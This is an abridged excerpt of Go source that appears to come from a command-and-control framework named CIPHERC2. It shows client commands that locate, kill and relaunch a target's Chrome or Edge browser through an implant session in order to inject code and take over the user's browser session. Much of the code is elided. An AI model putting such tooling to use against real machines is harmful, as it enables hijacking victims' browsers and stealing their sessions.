...
import (
	...
	"github.com/cs23m001/CIPHERC2/client/tcpproxy"
...
func CursedChromeCmd(cmd *cobra.Command, con *console.CIPHERC2Client, args []string) {
...
func avadaKedavraChrome(session *clientpb.Session, cmd *cobra.Command, con *console.CIPHERC2Client, cargs []string) *core.CursedProcess {
	...
	if chromeProcess != nil {
		...
		con.PrintWarnf("CIPHERC2 will need to kill and restart the Chrome process in order to perform code injection.\n")
		con.PrintWarnf("CIPHERC2 will attempt to restore the user's session, however %sDATA LOSS MAY OCCUR!%s\n", console.Bold, console.Normal)
		con.Printf("\n")
		confirm := false
		...
		terminateResp, err := con.Rpc.Terminate(context.Background(), &CIPHERC2pb.TerminateReq{
...
func startCursedChromeProcess(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.CIPHERC2Client, cargs []string) (*core.CursedProcess, error) {
	name := "Chrome"
	if isEdge {
		name = "Edge"
	}
	...
	chromeExec, err := con.Rpc.Execute(context.Background(), &CIPHERC2pb.ExecuteReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    chromeExePath,
		Args:    args,
		Output:  false,
...
func findChromeUserDataDir(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.CIPHERC2Client) (string, error) {
	...
	case "windows":
		...
		for _, driveLetter := range windowsDriveLetters {
			...
			ls, err := con.Rpc.Ls(context.Background(), &CIPHERC2pb.LsReq{
				Request: con.ActiveTarget.Request(cmd),
				Path:    userDataDir,
			})
			if err != nil {
...
func findChromeExecutablePath(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.CIPHERC2Client) (string, error) {
...
func getChromeProcess(session *clientpb.Session, cmd *cobra.Command, con *console.CIPHERC2Client) (*commonpb.Process, error) {
	ps, err := con.Rpc.Ps(context.Background(), &CIPHERC2pb.PsReq{
		Request: con.ActiveTarget.Request(cmd),
	})
	if err != nil {
		return nil, err
